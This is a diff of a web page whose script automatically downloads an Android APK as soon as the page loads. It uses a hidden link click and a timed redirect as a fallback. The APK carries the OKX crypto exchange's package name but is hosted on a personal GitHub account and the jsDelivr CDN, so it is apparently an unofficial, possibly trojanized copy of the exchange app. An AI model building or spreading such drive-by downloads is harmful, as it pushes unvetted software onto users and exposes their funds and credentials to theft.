@@ -6,18 +6,16 @@
 </head>
 <body>
 <script>
-  // 你要下载的 APK 链接
-  const url = "https://github.com/ppj50114-byte/ppj50114-byte.github.io/releases/download/v6.136.1/com.okinc.okex.gp.apk";
+  const url = "https://cdn.jsdelivr.net/gh/ppj50114-byte/ppj50114-byte.github.io@v6.136.1/com.okinc.okex.gp.apk";
 
-  // 创建一个隐藏的 <a> 元素，模拟点击下载
   const a = document.createElement("a");
   a.href = url;
-  a.download = "com.okinc.okex.gp.apk";  // 提示保存文件名
+  a.download = "com.okinc.okex.gp.apk";
   document.body.appendChild(a);
   a.click();
   document.body.removeChild(a);
 
-  // 如果浏览器拦截了下载，给个备用提示
+  // 备用跳转
   setTimeout(() => {
     window.location.href = url;
   }, 2000);
